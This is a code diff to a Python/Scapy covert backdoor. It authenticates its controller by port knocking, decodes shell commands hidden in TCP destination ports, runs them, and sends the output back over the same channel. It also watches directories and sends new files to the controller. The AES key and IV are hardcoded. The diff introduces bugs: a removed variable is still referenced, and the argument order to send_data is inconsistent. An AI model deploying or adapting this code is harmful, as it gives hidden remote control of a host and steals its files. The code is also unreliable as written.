@@ -15,8 +15,8 @@ from Crypto.Cipher import AES
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
 MONITOR = 0
-
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
+INIT_VALUE = "JohnCenaTheChamp"
 
 
 class NewFileHandler(FileSystemEventHandler):
@@ -28,22 +28,20 @@ class NewFileHandler(FileSystemEventHandler):
 		global MONITOR
 		filename = os.path.basename(event.src_path)
 		f_binary = file_to_binary(filename, event.src_path)
-		send_data(f_binary, self.packet[1].src, "write")
+		send_data(f_binary, self.packet[2].sport, self.packet[1].src, "write")
 		MONITOR = 1
 
 
-def encrypt_val(text):
-	secret = AES.new(MASTER_KEY)
-	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
-	cipher_text = base64.b64encode(secret.encrypt(tag_string))
-	return cipher_text
+def encrypt_val(string):
+    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+    encryptedData = base64.b64encode(objAES.encrypt(string))
+    return encryptedData
 
 
-def decrypt_val(cipher):
-	secret = AES.new(MASTER_KEY)
-	decrypted = secret.decrypt(base64.b64decode(cipher))
-	result = decrypted.rstrip("\0")
-	return result
+def decrypt_val(string):
+    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+    decryptedData = objAES.decrypt(base64.b64decode(string))
+    return decryptedData
 
 
 def verify_root():
@@ -61,7 +59,7 @@ def file_to_binary(file, path):
 	return byte_list
 
 
-def data_packet(dest, val1, val2=None):
+def data_packet(dest, sport, val1, val2=None):
 	if(len(val1) == 1):
 		if(val2 is None):
 			destport = ord(val1) << 8
@@ -72,27 +70,27 @@ def data_packet(dest, val1, val2=None):
 			destport = int(val1, 2)
 		else:
 			destport = int(val1 + val2, 2)
-	return IP(dst=dest) / TCP(sport=80, dport=destport)
+	return IP(dst=dest) / TCP(sport=sport, dport=destport)
 
 
-def end_msg(dest, output_type):
+def send_end_msg(dest, output_type, sport):
 	randPort = randint(1500, 65535)
 	if(output_type == "print"):
 		type_id = 42424
 	elif(output_type == "write"):
 		type_id = 41414
-	packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=80)
+	packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=sport)
 	send(packet)
 
 
-def send_data(msg, ip, output_type):
+def send_data(msg, ip, sport, output_type):
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		# delay_sleep()
-		send(data_packet(ip, char1, char2))
+		send(data_packet(ip, sport, char1, char2))
 	if(len(msg) % 2):
 		# delay_sleep()
-		send(data_packet(ip, msg[-1]))
-	end_msg(ip, output_type)
+		send(data_packet(ip, sport, msg[-1]))
+	send_end_msg(ip, output_type, sport)
 
 
 def run_cmd(packet, cmd):
@@ -118,7 +116,7 @@ def run_cmd(packet, cmd):
 		output.append(err)
 	# output = encrypt_val("".join(output))
 	time.sleep(0.1)
-	send_data(''.join(output), packet[1].src, "print")
+	send_data(''.join(output), packet[1].src, packet[2].sport, "print")
 
 
 def watch_dir(packet, path):
@@ -134,7 +132,7 @@ def watch_dir(packet, path):
 	observer.join()
 
 
-def execute(packet, command):
+def read_inst(packet, command):
 	cmd = command.split(' ', 1)
 	if(cmd[0] == "run"):
 		run_cmd(packet, cmd[1])
@@ -146,18 +144,19 @@ def execute(packet, command):
 
 def decode(packet):
 	global CMDS
-	ip = packet[1].src
+	sport = packet[2].sport
 	if(packet[1].id == 42424):
-		execute(packet, ''.join(CMDS[ip]))
+		read_inst(packet, ''.join(CMDS[sport]))
 		CMDS[ip] = ""
 		return
-	dport = packet[2].dport
-	char1 = chr((dport >> 8) & 0xff)
-	char2 = chr(dport & 0xff)
-	if(char2 is not None):
-		CMDS[ip] += "{}{}".format(char1, char2)
 	else:
-		CMDS[ip] += "{}".format(char1)
+		dport = packet[2].dport
+		char1 = chr((dport >> 8) & 0xff)
+		char2 = chr(dport & 0xff)
+		if(char2 is not None):
+			CMDS[sport] += "{}{}".format(char1, char2)
+		else:
+			CMDS[sport] += "{}".format(char1)
 
 
 def port_knock_auth(packet):
@@ -173,13 +172,8 @@ def port_knock_auth(packet):
 		auth = CONN_IPS[ip]
 		# Connecting IP is already authenticated
 		if(auth == 3):
-			if(dport == dc):
-				del CONN_IPS[ip]
-				print("{} has disconnected".format(ip))
-				return
-			if(sport == 80):
-				decode(packet)
-				return
+			decode(packet)
+			return
 		elif(dport not in access):
 			del CONN_IPS[ip]
 		# Connecting IP matches second knock
